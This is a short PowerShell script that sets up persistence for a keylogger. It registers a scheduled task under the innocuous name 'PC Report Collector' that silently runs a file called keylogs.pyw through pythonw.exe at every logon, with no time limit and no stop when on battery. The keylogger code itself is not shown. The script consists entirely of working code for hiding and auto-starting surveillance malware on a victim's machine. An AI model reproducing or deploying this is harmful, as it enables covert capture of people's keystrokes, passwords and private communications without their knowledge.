$Folder = "$env:USERPROFILE\file"
$PythonW = (Get-Command pythonw.exe).Source

$Action = New-ScheduledTaskAction `
    -Execute $PythonW `
    -Argument "`"$Folder\keylogs.pyw`"" `
    -WorkingDirectory $Folder

$Trigger = New-ScheduledTaskTrigger -AtLogOn

$Settings = New-ScheduledTaskSettingsSet `
    -StartWhenAvailable `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -ExecutionTimeLimit ([TimeSpan]::Zero)

Register-ScheduledTask `
    -TaskName "PC Report Collector" `
    -Action $Action `
    -Trigger $Trigger `
    -Settings $Settings `
    -Force
